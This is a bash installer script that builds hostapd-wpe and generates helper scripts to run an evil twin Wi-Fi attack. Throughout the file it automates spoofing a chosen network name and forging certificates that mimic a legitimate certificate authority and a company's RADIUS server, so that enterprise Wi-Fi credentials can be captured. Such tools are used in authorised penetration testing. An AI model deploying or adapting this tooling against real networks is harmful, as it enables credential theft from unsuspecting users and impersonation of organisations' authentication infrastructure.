#!/bin/bash
# Before running ensure you have an internet connection
# hostapd-wpe-installer.sh created by Jesse Nebling (@bashexplode)
# hostapd-wpe.sh run script and cert+ssid-customizer.sh also by Jesse Nebling
# License: BSD 3-Clause

# Check for an internet connection
if ping -q -c 1 -W 1 google.com >/dev/null; then
  printf "[+] You are connected to the internet, congrats!\n"
else
  printf "[-] You are not connected to the internet, please connect to proceed.\n"
  exit 1
fi

# Set current directory to go back to at the end
currentdir=$(pwd)

printf  "[*] Installing dependencies...\n"
apt-get update -qq
apt-get install -qq -y libssl-dev libnl-genl-3-dev
printf  "[+] Dependency installation complete.\n"

mkdir hostapd
cd hostapd

# Set hostapd dir to a variable
hostdir=$(pwd)

printf  "[*] Pulling hostapd and hostapd-wpe...\n"
wget -q http://hostap.epitest.fi/releases/hostapd-2.6.tar.gz
tar -zxf hostapd-2.6.tar.gz
git clone -q https://github.com/OpenSecurityResearch/hostapd-wpe.git
printf  "[+] Download complete.\n"

printf  "[*] Applying patches and compiling source...\n"
cd hostapd-2.6/
patch -p1 < ../hostapd-wpe/hostapd-wpe.patch
cd hostapd
sed -i '/#CONFIG_LIBNL32=y/c\CONFIG_LIBNL32=y' .config
make -s
printf  "[+] Patches applied and source compiled.\n"

printf  "[*] Setting defaults on config files...\n"
sed -i '/interface=eth0/c\interface=wlan0' hostapd-wpe.conf
sed -i '/driver=wired/c\#driver=wired' hostapd-wpe.conf
sed -i '/#ssid=hostapd-wpe/c\ssid=testnet' hostapd-wpe.conf
sed -i '/#hw_mode=g/c\hw_mode=g' hostapd-wpe.conf
sed -i '/#channel=1/c\channel=6' hostapd-wpe.conf
sed -i '/wpa=1/c\wpa=2' hostapd-wpe.conf
printf  "[+] Defaults set.\n"

printf  "[*] Creating customization and run scripts...\n"
cd $hostdir
rm hostapd-2.6.tar.gz
# Create the run script
printf "#!/bin/bash\n" >> hostapd-wpe.sh
printf "# Runs Evil Twin attack\n" >> hostapd-wpe.sh
printf "# Script by Jesse Nebling\n" >> hostapd-wpe.sh
printf "\n" >> hostapd-wpe.sh
printf "# Was running into random issues with the driver failing so needed to add the next 3 lines\n" >> hostapd-wpe.sh
printf "nmcli radio wifi off\n" >> hostapd-wpe.sh
printf "rfkill unblock wlan\n" >> hostapd-wpe.sh
printf "ifconfig wlan0 up\n" >> hostapd-wpe.sh
printf "sleep 1\n" >> hostapd-wpe.sh
printf "\n" >> hostapd-wpe.sh
printf "currentdir=\$(pwd)\n" >> hostapd-wpe.sh
printf "cd hostapd-2.6/hostapd/\n" >> hostapd-wpe.sh
printf "./hostapd-wpe hostapd-wpe.conf\n" >> hostapd-wpe.sh
printf "cd \$currentdir\n" >> hostapd-wpe.sh

# Create the customizer script
printf "#!/bin/bash\n" >> cert+ssid-customizer.sh
printf "# This script prompts the user for the ESSID they would like to spoof\n" >> cert+ssid-customizer.sh
printf "# as well as information to create spoofed SSL certificates.\n" >> cert+ssid-customizer.sh
printf "# Script by Jesse Nebling\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "# Set current directory\n" >> cert+ssid-customizer.sh
printf "currentdir=\$(pwd)\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "# Ask user what the ESSID should be and set it to a variable\n" >> cert+ssid-customizer.sh
printf "printf \"What would you like the ESSID to be? \"\n" >> cert+ssid-customizer.sh
printf "read essid\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "# Ask various questions about cert properties and set to variables\n" >> cert+ssid-customizer.sh
printf "printf \"\\\nPlease input info for the certificates\"\n" >> cert+ssid-customizer.sh
printf "printf \"\\\nType the two letter country abbreviation (i.e. US): \"\n" >> cert+ssid-customizer.sh
printf "read country\n" >> cert+ssid-customizer.sh
printf "printf \"Type the two letter state or providence (i.e. WA): \"\n" >> cert+ssid-customizer.sh
printf "read state\n" >> cert+ssid-customizer.sh
printf "printf \"Type the city name (i.e. Seattle): \"\n" >> cert+ssid-customizer.sh
printf "read city\n" >> cert+ssid-customizer.sh
printf "printf \"Type the organization name (i.e. Contoso LLC): \"\n" >> cert+ssid-customizer.sh
printf "read org\n" >> cert+ssid-customizer.sh
printf "printf \"Make up an admin email address for the company (i.e. admin@contoso.com): \"\n" >> cert+ssid-customizer.sh
printf "read email\n" >> cert+ssid-customizer.sh
printf "printf \"What is the certificate authority name (Try to spoof their legit cert, i.e. Digicert High Assurance Root Certificate Authority): \"\n" >> cert+ssid-customizer.sh
printf "read certauth\n" >> cert+ssid-customizer.sh
printf "printf \"What is the name of the radius authentication server (i.e. eap-auth.contoso.com, if not Contoso Auth Cert, etc): \"\n" >> cert+ssid-customizer.sh
printf "read servcert\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "# Set the SSID in the conf file\n" >> cert+ssid-customizer.sh
printf "cd hostapd-2.6/hostapd\n" >> cert+ssid-customizer.sh
printf "sed -i \"s/^ssid=.*$/ssid=\$essid/\" hostapd-wpe.conf\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "cd \$currentdir/hostapd-wpe/certs\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "# Wipe out configuration settings in the ca.cnf file and replace with answers received\n" >> cert+ssid-customizer.sh
printf "sed -i '/\[certificate_authority\]/q' ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"countryName\\\t\\\t= \$country\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"stateOrProvinceName\\\t= \$state\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"localityName\\\t\\\t= \$city\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"organizationName\\\t= \$org\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"emailAddress\\\t\\\t= \$email\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"commonName\\\t\\\t= \\\\\"\$certauth\\\\\"\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \\\"\\\n\\\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"[v3_ca]\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"subjectKeyIdentifier\\\t= hash\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"authorityKeyIdentifier\\\t= keyid:always,issuer:always\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"basicConstraints\\\t= CA:true\\\n\" >> ca.cnf\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "# Wipe out configuration settings in the server.cnf file and replace with answers received\n" >> cert+ssid-customizer.sh
printf "sed -i '/\[server\]/q' server.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"countryName\\\t\\\t= \$country\\\n\" >> server.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"stateOrProvinceName\\\t= \$state\\\n\" >> server.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"localityName\\\t\\\t= \$city\\\n\" >> server.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"organizationName\\\t= \$org\\\n\" >> server.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"emailAddress\\\t\\\t= \$email\\\n\" >> server.cnf\n" >> cert+ssid-customizer.sh
printf "printf \"commonName\\\t\\\t= \\\\\"\$servcert\\\\\"\\\\n\" >> server.cnf\n" >> cert+ssid-customizer.sh
printf "printf \\\"\\\n\\\" >> server.cnf\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "printf  \"[*] Creating custom certs...\\\n\"\n" >> cert+ssid-customizer.sh
printf "# Run the prepackaged bootstrap app to create the custom certs\n" >> cert+ssid-customizer.sh
printf "./bootstrap\n" >> cert+ssid-customizer.sh
printf "printf  \"[+] Custom certs created.\\\n\"\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "# Set directory back to original execution dir\n" >> cert+ssid-customizer.sh
printf "cd \$currentdir\n" >> cert+ssid-customizer.sh
printf "printf  \"[+] Ready to go, run hostapd-wpe.sh now.\\\n\\\n\"\n" >> cert+ssid-customizer.sh
printf "\n" >> cert+ssid-customizer.sh
printf "[+] Scripts created.\n"

# Give execution rights to the scripts that were created
chmod +x hostapd-wpe.sh
chmod +x cert+ssid-customizer.sh

printf  "\n[+] You are now ready to use hostapd!\n"
printf  "[!] Be sure to run the cert+ssid-customizer.sh script to customize your attack.\n"
printf  "[!] After that run the hostapd-wpe.sh script to begin the Evil Twin Attack.\n"
